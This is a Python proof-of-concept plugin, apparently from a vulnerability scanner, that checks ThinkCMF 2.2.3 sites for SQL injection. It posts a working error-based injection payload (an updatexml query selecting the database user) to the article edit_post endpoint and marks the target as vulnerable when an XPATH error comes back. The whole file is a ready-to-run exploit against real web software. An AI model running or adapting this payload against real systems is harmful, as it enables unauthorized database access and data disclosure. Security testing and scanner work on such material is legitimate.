#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'thinkcmf 2.2.3 sql'
        self.keyword = ['thinkcmf', 'php']
        self.info = 'thinkcmf 2.2.3 sql'
        self.type = VUL_TYPE.SQL
        self.level = VUL_LEVEL.HIGH
        self.refer = 'https://xz.aliyun.com/t/3529'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './'),
            ]))
            async with ClientSession() as session:
                for path in path_list:
                    url = path + "index.php?g=Portal&m=Article&a=edit_post"
                    _data = 'term=123&post[post_title]=123&post[post_title]=aaa&post_title=123&post[id][0]=bind&post[id][1]=0 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))'
                    async with session.post(url=url, data=_data) as res:
                        if res != None:
                            text = await res.text()
                            if ':XPATH' in text:
                                self.flag = 1
                                self.res.append({"info": url, "key": "thinkcmf 2.2.3 sql"})
